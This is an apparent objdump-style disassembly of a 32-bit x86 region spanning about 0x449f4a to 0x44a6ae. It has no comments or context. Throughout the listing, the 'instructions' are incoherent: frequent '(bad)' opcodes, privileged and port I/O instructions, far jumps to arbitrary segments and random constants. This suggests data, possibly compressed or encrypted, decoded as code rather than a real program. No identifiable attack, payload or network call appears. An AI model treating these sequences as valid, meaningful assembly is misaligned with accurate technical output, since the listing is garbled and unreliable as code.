  449f4a:	push   es
  449f4b:	ret    
  449f4c:	xchg   edx,eax
  449f4d:	inc    edi
  449f4e:	sahf   
  449f4f:	xchg   BYTE PTR [edx],dl
  449f51:	(bad)  
  449f52:	inc    DWORD PTR [ebp-0x590fdc87]
  449f58:	retf   0x2d45
  449f5b:	js     0x449f9f
  449f5d:	inc    edx
  449f5e:	fld    TBYTE PTR cs:[ebx+edi*1-0x2f]
  449f63:	adc    DWORD PTR [edx+0x4a462159],esp
  449f69:	pop    ebp
  449f6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449f6b:	sbb    DWORD PTR [esi+0x2],edx
  449f6e:	rcr    BYTE PTR [eax],0x54
  449f71:	or     edx,ebp
  449f73:	addr16 push ebp
  449f75:	call   0xfbff012c
  449f7a:	daa    
  449f7b:	daa    
  449f7c:	xlat   BYTE PTR ds:[ebx]
  449f7d:	enter  0x44c6,0xa2
  449f81:	ja     0x44a002
  449f83:	xlat   BYTE PTR ds:[ebx]
  449f84:	xchg   BYTE PTR [edi-0x4d],bl
  449f87:	repnz mov cs,WORD PTR [ebx-0x4f8f5832]
  449f8e:	and    ecx,DWORD PTR [ebx]
  449f90:	pusha  
  449f91:	mov    esp,0xc4a1583e
  449f96:	cmp    dl,bl
  449f98:	mov    eax,0xb51f0bcb
  449f9d:	mov    bh,0x17
  449f9f:	cld    
  449fa0:	ja     0x449f47
  449fa2:	or     dh,BYTE PTR [edi+0x13]
  449fa5:	push   edx
  449fa6:	pushf  
  449fa7:	imul   edx,DWORD PTR [edx+0x5e],0x5d3aa38e
  449fae:	xchg   DWORD PTR [edi],eax
  449fb0:	mov    eax,ds:0xecdf9d09
  449fb5:	add    eax,0x1b23eb5e
  449fba:	fsub   DWORD PTR [edx-0x4f]
  449fbd:	dec    edi
  449fbe:	mov    dh,BYTE PTR [esi-0x14543f0b]
  449fc4:	mov    ebx,0xe0a45044
  449fc9:	sbb    edi,DWORD PTR [ebx-0x34e48a0c]
  449fcf:	mov    fs:0x1dad5550,al
  449fd5:	mov    al,0x25
  449fd7:	aaa    
  449fd8:	mov    bh,0x6a
  449fda:	stc    
  449fdb:	sti    
  449fdc:	cwde   
  449fdd:	mov    ebx,DWORD PTR [eax+eiz*2]
  449fe0:	jno    0x449feb
  449fe2:	mov    BYTE PTR [esi+0x3],dh
  449fe5:	xchg   esi,eax
  449fe6:	popf   
  449fe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449fe8:	adc    bh,BYTE PTR [esi-0x25]
  449feb:	sbb    BYTE PTR [esi],ah
  449fed:	outs   dx,BYTE PTR ds:[esi]
  449fee:	jmp    0xa163:0xfb43226b
  449ff5:	mov    cs,edx
  449ff7:	mov    eax,ds:0x4fb77b52
  449ffc:	fwait
  449ffd:	push   edx
  449ffe:	popf   
  449fff:	daa    
  44a000:	cmp    BYTE PTR [ebp-0x508fd032],dl
  44a006:	(bad)  
  44a007:	out    0xce,eax
  44a009:	inc    edx
  44a00a:	pop    esp
  44a00b:	arpl   WORD PTR [edx],cx
  44a00d:	xor    eax,0xc82a355b
  44a012:	sub    ch,BYTE PTR [edi]
  44a014:	test   ecx,0x4093b711
  44a01a:	and    eax,0x8bb5ffbe
  44a01f:	sbb    al,0xb0
  44a021:	pop    eax
  44a022:	jns    0x44a004
  44a024:	adc    BYTE PTR [ebx+0x20],0xe5
  44a028:	fidivr WORD PTR [edx-0x17]
  44a02b:	cmc    
  44a02c:	(bad)  
  44a02d:	mov    esi,DWORD PTR [edx]
  44a02f:	imul   esi,DWORD PTR [edx+0x627f50c2],0xffffffa5
  44a036:	add    bl,BYTE PTR [eax+0x7c]
  44a039:	das    
  44a03a:	cmp    dh,bl
  44a03c:	xchg   BYTE PTR [ecx],al
  44a03e:	or     eax,0x91c36cc
  44a043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a044:	div    BYTE PTR [edx-0x7c0f0fed]
  44a04a:	push   edx
  44a04b:	ja     0x44a06a
  44a04d:	jl     0x44a026
  44a04f:	popf   
  44a050:	(bad)  
  44a051:	pop    ebx
  44a052:	sbb    al,BYTE PTR [edi]
  44a054:	fwait
  44a055:	push   ebx
  44a056:	pushf  
  44a057:	and    esi,DWORD PTR [edi]
  44a059:	test   al,0xc1
  44a05b:	lods   al,BYTE PTR ds:[esi]
  44a05c:	mov    edx,0x72375f8b
  44a061:	cmp    DWORD PTR [ebp-0x25d670b2],esp
  44a067:	sbb    dh,BYTE PTR [esi-0x441f29b1]
  44a06d:	inc    ebx
  44a06e:	ficomp DWORD PTR [esi]
  44a070:	test   DWORD PTR [ebx+0x2f],0x1b7f2ea
  44a077:	test   DWORD PTR [ecx],0xcab3e9a2
  44a07d:	jo     0x44a09e
  44a07f:	daa    
  44a080:	sbb    BYTE PTR [ebx],cl
  44a082:	dec    ebx
  44a083:	imul   edi,DWORD PTR [ebp-0x16],0xb3250a4a
  44a08a:	and    bl,BYTE PTR [ebp+0x62937514]
  44a090:	sub    DWORD PTR [edx+0x18],edi
  44a093:	sbb    ebp,DWORD PTR [edx]
  44a095:	(bad)  gs:[ebx+0x1f5e6b23]
  44a09c:	sahf   
  44a09d:	or     esp,0x77
  44a0a0:	mov    ebx,0xe225d488
  44a0a5:	mov    edx,ebx
  44a0a7:	(bad)  
  44a0a8:	out    dx,al
  44a0a9:	jno    0x44a085
  44a0ab:	pop    ds
  44a0ac:	(bad)  
  44a0ad:	and    esi,esi
  44a0af:	(bad)  
  44a0b0:	ds das 
  44a0b2:	cld    
  44a0b3:	mov    edx,0x8ef22166
  44a0b8:	mov    WORD PTR [esi+ebx*4-0x4704704e],?
  44a0bf:	cwde   
  44a0c0:	loop   0x44a10a
  44a0c2:	loop   0x44a0e3
  44a0c4:	jp     0x44a0c8
  44a0c6:	sub    al,0xaf
  44a0c8:	repnz mov ebx,0x93abee82
  44a0ce:	and    BYTE PTR [edi],dh
  44a0d0:	aas    
  44a0d1:	add    ecx,ebp
  44a0d3:	fmulp  st(6),st
  44a0d5:	mov    WORD PTR [edx],ds
  44a0d7:	repnz mov cl,0xdf
  44a0da:	dec    ebx
  44a0db:	jne    0x44a12d
  44a0dd:	fwait
  44a0de:	xor    eax,0x492d4d3e
  44a0e3:	or     al,0x32
  44a0e5:	add    dl,BYTE PTR [eax+0x6]
  44a0e8:	mov    bl,0xf
  44a0ea:	push   ecx
  44a0eb:	add    al,0xcf
  44a0ed:	test   BYTE PTR [edx+0x5c89ce05],cl
  44a0f3:	cmp    eax,ecx
  44a0f5:	adc    DWORD PTR [esi],0x8b53bb7
  44a0fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a0fc:	es mov cl,0x11
  44a0ff:	std    
  44a100:	xrelease xchg DWORD PTR [eax],ebx
  44a103:	jmp    0x44a115
  44a105:	add    edx,DWORD PTR [esi]
  44a107:	xchg   esi,eax
  44a108:	cmp    cl,ah
  44a10a:	and    dl,dl
  44a10c:	ins    DWORD PTR es:[edi],dx
  44a10d:	adc    DWORD PTR [edx-0x33fc983d],0x6a
  44a114:	mov    edx,0xf9ab5f45
  44a119:	retf   
  44a11a:	jae    0x44a136
  44a11c:	xor    cl,BYTE PTR [ebp+0x2d]
  44a11f:	push   cs
  44a120:	sub    ah,BYTE PTR [ecx+ebx*4+0x1aa4ef]
  44a127:	sbb    edi,DWORD PTR [eax-0x1ad811c6]
  44a12d:	test   DWORD PTR [esi+0x7d],eax
  44a130:	nop
  44a131:	jmp    0x44a17c
  44a133:	adc    eax,0x164c0bd2
  44a138:	add    bh,BYTE PTR [edi-0x71e7977c]
  44a13e:	mov    dl,0x2b
  44a140:	into   
  44a141:	test   DWORD PTR [edx-0x6d61fe8d],eax
  44a147:	adc    eax,0x834bf321
  44a14c:	pop    ds
  44a14d:	add    BYTE PTR [edx],0xa8
  44a150:	adc    eax,0x2c601888
  44a155:	jge    0x44a0e9
  44a157:	das    
  44a158:	cmp    esi,DWORD PTR [edi-0x7bd1dcea]
  44a15e:	push   0x2b
  44a160:	xor    cl,BYTE PTR [ebx+0x7f]
  44a163:	fucomi st,st(3)
  44a165:	call   0x787f849c
  44a16a:	fidivr DWORD PTR [edx-0x40]
  44a16d:	dec    ebx
  44a16e:	inc    eax
  44a16f:	(bad)  
  44a170:	repnz shl edi,cl
  44a173:	out    0x60,eax
  44a175:	ins    BYTE PTR es:[edi],dx
  44a176:	fisubr DWORD PTR [esi-0x2e]
  44a179:	dec    ebx
  44a17a:	pop    ebp
  44a17b:	cmp    bh,dl
  44a17d:	mov    bh,0x1a
  44a17f:	ja     0x44a1b3
  44a181:	mov    al,ds:0xee56419a
  44a186:	inc    eax
  44a187:	jg     0x44a194
  44a189:	scas   al,BYTE PTR es:[edi]
  44a18a:	xchg   esi,eax
  44a18b:	pop    eax
  44a18c:	outs   dx,BYTE PTR ds:[esi]
  44a18d:	mov    bl,0xc
  44a18f:	dec    esi
  44a190:	cmp    eax,0x821112aa
  44a195:	pop    es
  44a196:	inc    ecx
  44a197:	dec    DWORD PTR [ebx+ebx*1]
  44a19a:	xchg   ebp,eax
  44a19b:	jns    0x44a214
  44a19d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a19e:	sbb    DWORD PTR [edx+0x70],edi
  44a1a1:	mov    ds:0xab097e7a,al
  44a1a6:	or     bh,BYTE PTR [ebx-0x40f5446a]
  44a1ac:	cwde   
  44a1ad:	pop    ds
  44a1ae:	shl    DWORD PTR [ebx+0x2e],cl
  44a1b1:	adc    ecx,DWORD PTR [ecx]
  44a1b3:	dec    eax
  44a1b4:	or     cl,BYTE PTR [ecx+0x76ba6372]
  44a1ba:	jle    0x44a15f
  44a1bc:	retf   0x9cea
  44a1bf:	shr    DWORD PTR [edx+esi*8-0x26],cl
  44a1c3:	jl     0x44a1a1
  44a1c5:	inc    esp
  44a1c6:	dec    ebp
  44a1c7:	xchg   ebp,eax
  44a1c8:	call   0x3983:0xf6cebf63
  44a1cf:	sbb    DWORD PTR [edx],esp
  44a1d1:	mov    ebp,esp
  44a1d3:	fbstp  TBYTE PTR [eax]
  44a1d5:	mov    cs,edx
  44a1d7:	dec    ebx
  44a1d8:	pop    ecx
  44a1d9:	jmp    0xcbab613b
  44a1de:	sub    eax,0x72a80877
  44a1e3:	inc    esi
  44a1e4:	call   0x3bb7:0x8c2f38b5
  44a1eb:	xchg   edi,eax
  44a1ec:	ins    DWORD PTR es:[edi],dx
  44a1ed:	bnd jle 0x44a267
  44a1f0:	or     bl,dh
  44a1f2:	jl     0x44a1df
  44a1f4:	data16 outs dx,BYTE PTR ds:[esi]
  44a1f6:	mov    BYTE PTR [ebp+0x7f],al
  44a1f9:	or     eax,0x330f7c4f
  44a1fe:	cmp    ebp,DWORD PTR [ebx-0x9a905c1]
  44a204:	ss call 0x42be:0xe232f56b
  44a20c:	sar    BYTE PTR [ecx-0x42],1
  44a20f:	enter  0x7bf4,0x40
  44a213:	mov    esi,0x8f5ff542
  44a218:	outs   dx,DWORD PTR ds:[esi]
  44a219:	lock pop eax
  44a21b:	arpl   WORD PTR [eax-0x15],sp
  44a21e:	sahf   
  44a21f:	adc    al,0x73
  44a221:	push   0x5c
  44a223:	xchg   edi,eax
  44a224:	sar    BYTE PTR [eax-0x16],0xed
  44a228:	xor    ch,BYTE PTR [ebx+0xc697a79]
  44a22e:	dec    DWORD PTR [edx+0x59]
  44a231:	loope  0x44a286
  44a233:	mov    edi,ecx
  44a235:	push   ebp
  44a236:	ins    DWORD PTR es:[edi],dx
  44a237:	es imul edx,ebx,0x64
  44a23b:	jno    0x44a2b5
  44a23d:	imul   esp,DWORD PTR [edx+0x62955b79],0x4f
  44a244:	in     al,dx
  44a245:	iret   
  44a246:	xchg   ebx,eax
  44a247:	dec    ebp
  44a248:	imul   ecx,DWORD PTR [esi],0x96a6427b
  44a24e:	xchg   edx,eax
  44a24f:	fdiv   st(2),st
  44a251:	mov    al,ds:0xae7c640a
  44a256:	sbb    BYTE PTR [ebp+0x3e],al
  44a259:	test   al,0x1a
  44a25b:	ficomp DWORD PTR [eax+0x2b]
  44a25e:	arpl   WORD PTR [ecx-0x6e],ax
  44a261:	jle    0x44a2db
  44a263:	xchg   ebx,eax
  44a265:	aam    0xce
  44a267:	sar    DWORD PTR [edx],cl
  44a269:	mov    dl,cl
  44a26b:	je     0x44a290
  44a26d:	lods   eax,DWORD PTR ds:[esi]
  44a26e:	ret    0x4b6f
  44a271:	or     esp,DWORD PTR [ebx]
  44a273:	sbb    eax,0x1322f50e
  44a278:	pop    es
  44a279:	ja     0x44a2e3
  44a27b:	pop    esp
  44a27c:	int    0xeb
  44a27e:	sbb    al,0x3a
  44a280:	xchg   edi,eax
  44a281:	test   eax,0xeb3630bd
  44a286:	inc    esp
  44a287:	jo     0x44a2ea
  44a289:	push   cs
  44a28a:	jl     0x44a302
  44a28c:	lods   al,BYTE PTR ds:[esi]
  44a28d:	(bad)  
  44a28e:	sar    BYTE PTR [ebp-0x63],cl
  44a291:	push   DWORD PTR [esi]
  44a293:	lahf   
  44a294:	inc    esi
  44a295:	jne    0x44a2f8
  44a297:	push   eax
  44a298:	xchg   edx,eax
  44a299:	ret    0x547c
  44a29c:	ret    0x7f56
  44a29f:	jmp    0x44a304
  44a2a1:	push   edx
  44a2a2:	xchg   ebx,eax
  44a2a3:	jnp    0x44a317
  44a2a5:	lods   al,BYTE PTR ds:[esi]
  44a2a6:	xor    BYTE PTR [edi+0x4560c36],bh
  44a2ac:	int    0xce
  44a2ae:	pop    ds
  44a2af:	jecxz  0x44a2e3
  44a2b1:	jg     0x44a326
  44a2b3:	scas   eax,DWORD PTR es:[edi]
  44a2b4:	shl    DWORD PTR [edi+0x234243b2],0xe5
  44a2bb:	jle    0x44a2fc
  44a2bd:	das    
  44a2be:	xor    esp,DWORD PTR [esi+ebx*8+0x5]
  44a2c2:	and    DWORD PTR [eax],edx
  44a2c4:	xchg   edx,eax
  44a2c5:	std    
  44a2c6:	cmp    DWORD PTR [edi],ecx
  44a2c8:	sbb    DWORD PTR [ecx-0x5a48c019],edx
  44a2ce:	mov    eax,ds:0x6db30038
  44a2d3:	mov    edi,0x6b8ddb5a
  44a2d8:	js     0x44a309
  44a2da:	xchg   BYTE PTR [edi+0x635da4f2],bh
  44a2e0:	ja     0x44a2d7
  44a2e2:	inc    edx
  44a2e3:	idiv   DWORD PTR [edx-0x75]
  44a2e6:	inc    ecx
  44a2e7:	out    dx,eax
  44a2e8:	or     DWORD PTR [ebx-0x7de7886b],ecx
  44a2ee:	test   BYTE PTR [edx+0x2c],ch
  44a2f1:	jb     0x44a36d
  44a2f3:	mov    dh,0x32
  44a2f5:	js     0x44a368
  44a2f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a2f8:	(bad)
  44a2fb:	pop    edi
  44a2fc:	daa    
  44a2fd:	daa    
  44a2fe:	push   esi
  44a2ff:	jae    0x44a31f
  44a301:	add    al,0x21
  44a303:	sbb    edx,DWORD PTR [edx+0x2c0a31ad]
  44a309:	xchg   ecx,eax
  44a30a:	lea    ecx,[ebx]
  44a30c:	add    dl,BYTE PTR [edx]
  44a30e:	push   ecx
  44a30f:	mov    ds:0x1994c84e,eax
  44a314:	push   cs
  44a315:	pop    edx
  44a316:	pop    edx
  44a317:	les    ecx,FWORD PTR [edi]
  44a319:	out    0x51,eax
  44a31b:	cmp    dh,BYTE PTR [ebx+0x5e]
  44a31e:	dec    edi
  44a31f:	or     al,0x86
  44a321:	pop    DWORD PTR [edi+ebx*8]
  44a324:	leave  
  44a325:	sub    eax,0x814e551b
  44a32a:	jge    0x44a380
  44a32c:	inc    esi
  44a32d:	sbb    eax,0xb3d2a05f
  44a332:	sub    eax,0x36955087
  44a337:	or     al,bh
  44a339:	dec    ebx
  44a33a:	adc    eax,0x94c90ea3
  44a33f:	push   ds
  44a340:	pop    es
  44a341:	push   ss
  44a342:	and    al,0x26
  44a344:	or     al,cl
  44a346:	pop    ebx
  44a347:	sbb    eax,0xef53af82
  44a34c:	add    BYTE PTR [ebx+0x15620189],al
  44a352:	inc    edi
  44a353:	jnp    0x44a361
  44a355:	jne    0x44a2fb
  44a357:	or     BYTE PTR [ebx+0x4062db8],dh
  44a35d:	mov    dl,0x88
  44a35f:	mov    eax,ds
  44a361:	or     ebp,DWORD PTR [edx+0x67]
  44a364:	pop    es
  44a365:	mov    ebx,0xb808a487
  44a36a:	popf   
  44a36b:	cld    
  44a36c:	add    al,0xbf
  44a36e:	lea    edi,ds:0x328bb985
  44a374:	pop    ds
  44a375:	mov    esi,0x359ceb5f
  44a37a:	ficomp WORD PTR [ebx+0x4d]
  44a37d:	stos   DWORD PTR es:[edi],eax
  44a37e:	fwait
  44a37f:	pop    ecx
  44a380:	(bad)  
  44a381:	iret   
  44a382:	xchg   edx,eax
  44a383:	pop    edi
  44a384:	mov    ebp,0xb6a07a0f
  44a389:	retf   
  44a38a:	cdq    
  44a38b:	mov    ds:0x9f860a32,eax
  44a390:	icebp  
  44a391:	sub    esp,DWORD PTR [edi+eax*4-0x33]
  44a395:	neg    eax
  44a397:	cwde   
  44a398:	xchg   edx,eax
  44a399:	repz fdivr DWORD PTR [eax-0x577504c6]
  44a3a0:	dec    eax
  44a3a1:	dec    edx
  44a3a2:	fiadd  DWORD PTR [esi]
  44a3a4:	add    ebp,DWORD PTR [edi-0x7d]
  44a3a7:	push   edi
  44a3a8:	imul   esi,ebx,0x64
  44a3ab:	push   cs
  44a3ac:	leave  
  44a3ad:	jp     0x44a3f5
  44a3af:	cmp    edx,DWORD PTR [edx+0x25017c6e]
  44a3b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a3b6:	sbb    BYTE PTR [ebx+0x2a],dh
  44a3b9:	enter  0xa4d2,0x86
  44a3bd:	xor    edx,DWORD PTR [edi-0x47a7750f]
  44a3c3:	clc    
  44a3c4:	ret    0xfd4e
  44a3c7:	cmc    
  44a3c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a3c9:	inc    edx
  44a3ca:	popf   
  44a3cb:	call   0x56ffe984
  44a3d0:	sub    BYTE PTR [esi],al
  44a3d2:	fdivr  QWORD PTR [edi-0x5cef443d]
  44a3d8:	pop    ebp
  44a3d9:	test   al,0x9
  44a3db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a3dc:	adc    BYTE PTR [edi],ch
  44a3de:	or     ebp,DWORD PTR [edi-0x70b4cbc5]
  44a3e4:	dec    BYTE PTR [edi]
  44a3e6:	fwait
  44a3e7:	or     BYTE PTR [esi-0x7f],al
  44a3ea:	cmp    al,0xa5
  44a3ec:	xchg   esp,eax
  44a3ed:	cmp    BYTE PTR [edx],bh
  44a3ef:	shl    DWORD PTR [ecx],cl
  44a3f1:	jns    0x44a40c
  44a3f3:	into   
  44a3f4:	xor    DWORD PTR [ebp+0x19],esp
  44a3f7:	rcl    ch,0x96
  44a3fa:	mov    cl,bl
  44a3fc:	mov    ah,0x6e
  44a3fe:	das    
  44a3ff:	imul   ebp,DWORD PTR [esi-0x4376993],0x82d71c89
  44a409:	outs   dx,BYTE PTR ds:[esi]
  44a40a:	scas   al,BYTE PTR es:[edi]
  44a40b:	scas   al,BYTE PTR es:[edi]
  44a40c:	mov    eax,DWORD PTR [esi-0x6e]
  44a40f:	lds    edi,FWORD PTR [edi-0x2bb1675d]
  44a415:	sbb    eax,0x45fbe4ab
  44a41a:	mul    DWORD PTR [edx+ecx*8+0x6a]
  44a41e:	mov    al,0xc6
  44a420:	retf   
  44a421:	test   DWORD PTR [ebx+0x32],ebp
  44a424:	scas   eax,DWORD PTR es:[edi]
  44a425:	outs   dx,BYTE PTR ds:[esi]
  44a426:	(bad)  
  44a427:	xchg   esp,eax
  44a428:	call   FWORD PTR [esi+0x4b03c1f9]
  44a42e:	jmp    0x53b27be1
  44a433:	xchg   edx,edi
  44a435:	and    eax,0x6db407e8
  44a43a:	sti    
  44a43b:	sbb    bl,0x1e
  44a43e:	dec    ecx
  44a440:	jmp    0x44a47d
  44a442:	scas   al,BYTE PTR es:[edi]
  44a443:	cmp    edx,ecx
  44a445:	ja     0x44a425
  44a447:	lea    edi,[ebx-0x6d925988]
  44a44d:	jnp    0x44a40b
  44a44f:	cld    
  44a450:	xor    al,0xca
  44a452:	sbb    ecx,DWORD PTR [ebx]
  44a454:	repz xchg edi,eax
  44a456:	mov    ecx,ebp
  44a458:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a459:	cs stos BYTE PTR es:[edi],al
  44a45b:	adc    eax,0xd4c227e4
  44a460:	pop    ss
  44a461:	and    eax,DWORD PTR [esi]
  44a463:	xchg   ecx,eax
  44a464:	scas   al,BYTE PTR es:[edi]
  44a465:	and    eax,0x3cbb9683
  44a46a:	sub    eax,0x94210ab2
  44a46f:	adc    al,0xa6
  44a471:	cmp    BYTE PTR [ecx],bl
  44a473:	lahf   
  44a474:	xor    BYTE PTR [esi],bh
  44a476:	cmp    eax,0xed0e9a21
  44a47b:	xchg   ecx,eax
  44a47c:	pop    esp
  44a47d:	aaa    
  44a47e:	idiv   eax
  44a480:	ret    
  44a481:	retf   
  44a482:	cwde   
  44a483:	adc    eax,0x9046b29c
  44a488:	add    DWORD PTR [edx-0x2a],ebx
  44a48b:	mov    al,BYTE PTR [eax-0x64455dee]
  44a491:	jge    0x44a46d
  44a493:	outs   dx,DWORD PTR ds:[esi]
  44a494:	mov    cs:0x63c6328a,al
  44a49a:	repnz mov bh,0x8
  44a49d:	pop    ds
  44a49e:	test   BYTE PTR [ebp+0x46],0x23
  44a4a2:	push   cs
  44a4a3:	fist   DWORD PTR [edx+0x27]
  44a4a6:	adc    ebp,ebx
  44a4a8:	daa    
  44a4a9:	and    bh,ch
  44a4ab:	test   eax,esi
  44a4ad:	out    0xda,eax
  44a4af:	sbb    ebx,ecx
  44a4b1:	lods   eax,DWORD PTR ds:[esi]
  44a4b2:	pop    esp
  44a4b3:	push   0xffffff96
  44a4b5:	arpl   si,sp
  44a4b7:	call   0x91f95d62
  44a4bc:	xchg   DWORD PTR [edx+0x17],ecx
  44a4bf:	mov    ds:0x8dd84043,eax
  44a4c4:	rol    DWORD PTR ds:0x81abb930,0xec
  44a4cb:	cmp    eax,0x31ce6fbf
  44a4d0:	repnz pop eax
  44a4d2:	aad    0x8d
  44a4d4:	(bad)  
  44a4d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a4d6:	add    dl,BYTE PTR ds:[edx+0x70bc834]
  44a4dd:	imul   ebx,edx,0xb08129f7
  44a4e3:	and    eax,edi
  44a4e5:	lahf   
  44a4e6:	rcl    ebx,cl
  44a4e8:	push   cs
  44a4e9:	div    DWORD PTR [ebp*2+0x3ec05c47]
  44a4f0:	(bad)  
  44a4f1:	cs in  eax,dx
  44a4f3:	rol    WORD PTR [esi],0x3a
  44a4f7:	inc    ebx
  44a4f8:	or     cl,BYTE PTR [ecx-0x1]
  44a4fb:	jne    0x44a48e
  44a4fd:	dec    ebx
  44a4fe:	mov    edx,0xe9ff77e7
  44a503:	ss sahf 
  44a505:	sahf   
  44a506:	imul   ebx
  44a508:	xchg   esp,eax
  44a509:	dec    ecx
  44a50a:	imul   eax,DWORD PTR [esi+ebx*8+0x1df328e1],0xa1a6d2bb
  44a515:	dec    edi
  44a516:	test   eax,0x4b2de469
  44a51b:	aad    0x10
  44a51d:	push   ebp
  44a51e:	push   ebx
  44a51f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a520:	xchg   esi,eax
  44a521:	repnz pushf 
  44a523:	mov    bl,0xe6
  44a525:	adc    DWORD PTR [esi-0x37],0xf9016703
  44a52c:	fimul  WORD PTR [ecx]
  44a52e:	xchg   ebx,eax
  44a52f:	sahf   
  44a530:	mov    dh,0xbb
  44a532:	xchg   esp,eax
  44a533:	fwait
  44a534:	sar    DWORD PTR [eax-0x46],cl
  44a537:	ret    0x69df
  44a53a:	neg    dh
  44a53c:	mov    DWORD PTR [ebx],ebp
  44a53e:	loop   0x44a512
  44a540:	into   
  44a541:	gs xchg esp,eax
  44a543:	call   0xed88:0x69e87e90
  44a54a:	stc    
  44a54b:	iret   
  44a54c:	call   0xa562:0x3d8aa8c5
  44a553:	cmp    ch,bl
  44a555:	jb     0x44a4db
  44a557:	rol    esi,0xb7
  44a55a:	in     eax,dx
  44a55b:	pop    edi
  44a55c:	mov    dh,dl
  44a55e:	mov    eax,0xab7d9ca6
  44a563:	test   DWORD PTR [edx-0x24365178],edx
  44a569:	ins    DWORD PTR es:[edi],dx
  44a56a:	dec    DWORD PTR [esi-0x3a]
  44a56d:	pop    ebp
  44a56e:	dec    ebx
  44a56f:	aad    0x65
  44a571:	shl    ch,0x41
  44a574:	aam    0x16
  44a576:	stos   DWORD PTR es:[edi],eax
  44a577:	mov    DWORD PTR [edx-0x47555bf2],eax
  44a57d:	mov    edi,DWORD PTR [edi]
  44a57f:	fwait
  44a580:	(bad)  
  44a581:	jns    0x44a57d
  44a583:	rol    BYTE PTR [edx-0x223e0bbe],cl
  44a589:	scas   al,BYTE PTR es:[edi]
  44a58a:	aam    0x7e
  44a58c:	add    DWORD PTR [edx-0x5e],0xfb8ec707
  44a593:	(bad)  
  44a594:	jmp    0x251b:0xffdeee62
  44a59b:	cmp    BYTE PTR [edi+0x7fd2eb6e],0xd3
  44a5a2:	(bad)  
  44a5a3:	idiv   DWORD PTR [ebx+edi*1-0x14]
  44a5a7:	call   0xbe426c8a
  44a5ac:	scas   eax,DWORD PTR es:[edi]
  44a5ad:	push   ss
  44a5ae:	xchg   esp,eax
  44a5af:	mov    eax,0xd0e24ea9
  44a5b4:	ja     0x44a5fa
  44a5b6:	adc    ebp,ebx
  44a5b8:	pop    ebp
  44a5b9:	jge    0x44a618
  44a5bb:	retf   
  44a5bc:	xchg   edx,eax
  44a5bd:	and    DWORD PTR [edi+edx*4-0x3f0c9cc0],ebx
  44a5c4:	push   ebp
  44a5c5:	xchg   esp,eax
  44a5c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a5c7:	out    0xe9,al
  44a5c9:	push   0xffffffec
  44a5cb:	cmp    ch,BYTE PTR [esp+edx*8+0x7ecb1072]
  44a5d2:	pusha  
  44a5d3:	les    edx,FWORD PTR [ecx+0xf]
  44a5d6:	fnstenv [edx]
  44a5d8:	aam    0x6a
  44a5da:	test   ch,0x6c
  44a5dd:	jmp    DWORD PTR [esi+0x3b4f2f88]
  44a5e3:	and    esi,DWORD PTR [edi+0x24]
  44a5e6:	hlt    
  44a5e7:	and    bl,dl
  44a5e9:	xor    ebp,DWORD PTR [ecx]
  44a5eb:	jl     0x44a5dd
  44a5ed:	adc    eax,0x88a27766
  44a5f2:	inc    dl
  44a5f4:	ret    0x479c
  44a5f7:	lods   eax,DWORD PTR ds:[esi]
  44a5f8:	jg     0x44a662
  44a5fa:	shl    BYTE PTR [ebp+esi*8+0x19],1
  44a5fe:	(bad)  [edx]
  44a600:	out    dx,eax
  44a601:	js     0x44a593
  44a603:	iret   
  44a604:	loopne 0x44a594
  44a606:	adc    dh,ch
  44a608:	lods   eax,DWORD PTR ds:[esi]
  44a609:	cmp    BYTE PTR ds:0xc20dda87,bh
  44a60f:	push   cs
  44a610:	lods   al,BYTE PTR ds:[esi]
  44a611:	pop    esp
  44a612:	gs mov bl,0x81
  44a615:	cmp    DWORD PTR [eax],esp
  44a617:	rol    BYTE PTR [eax-0x430896],cl
  44a61d:	dec    esi
  44a61e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a61f:	mov    esi,0x4efe249c
  44a624:	vaddps ymm4,ymm3,ymm4
  44a628:	icebp  
  44a629:	dec    esp
  44a62a:	pop    ss
  44a62b:	stos   BYTE PTR es:[edi],al
  44a62c:	add    DWORD PTR [esi],esp
  44a62e:	xchg   esp,eax
  44a62f:	adc    ebx,edx
  44a631:	aas    
  44a632:	xor    DWORD PTR [eax+eiz*8+0x7d],0xffffffb8
  44a637:	xor    eax,0xa5ba3d3a
  44a63c:	jg     0x44a66d
  44a63e:	jmp    0xf31c:0x4dffbb95
  44a645:	(bad)  
  44a646:	sbb    al,0x21
  44a648:	add    BYTE PTR [eax-0x4754c5d8],cl
  44a64e:	add    ecx,DWORD PTR [ebp+0x47763e0e]
  44a654:	push   ss
  44a655:	inc    eax
  44a656:	pusha  
  44a657:	fisubr WORD PTR [edi-0x25330aa1]
  44a65d:	cmp    BYTE PTR [ebx-0x7ce746e],ah
  44a663:	cmp    eax,DWORD PTR [esi-0x6b90dcc6]
  44a669:	xor    ah,bh
  44a66b:	sahf   
  44a66c:	(bad)  
  44a66d:	loope  0x44a64d
  44a66f:	lahf   
  44a670:	mov    ch,0x65
  44a672:	std    
  44a673:	sar    ah,cl
  44a675:	jle    0x44a62c
  44a677:	repnz lahf 
  44a679:	add    DWORD PTR [esi],edi
  44a67b:	xor    edi,DWORD PTR [edx-0x27805b41]
  44a681:	cmp    ebx,DWORD PTR [eax+0x614ba67d]
  44a687:	mov    ss,ebp
  44a689:	iret   
  44a68a:	mov    ah,0xa1
  44a68c:	jae    0x44a644
  44a68e:	mov    edi,0x97033abb
  44a693:	sahf   
  44a694:	mov    edx,0xeba0a42b
  44a699:	dec    ebp
  44a69a:	cwde   
  44a69b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a69c:	imul   ecx,DWORD PTR [ebp+0xa58a398],0xcbb1f877
  44a6a6:	inc    esi
  44a6a7:	and    dh,BYTE PTR [edx]
  44a6a9:	shr    BYTE PTR [ecx],1
  44a6ab:	daa    
  44a6ac:	mov    ah,BYTE PTR [ecx]
  44a6ae:	or     eax,0x320ca4b0
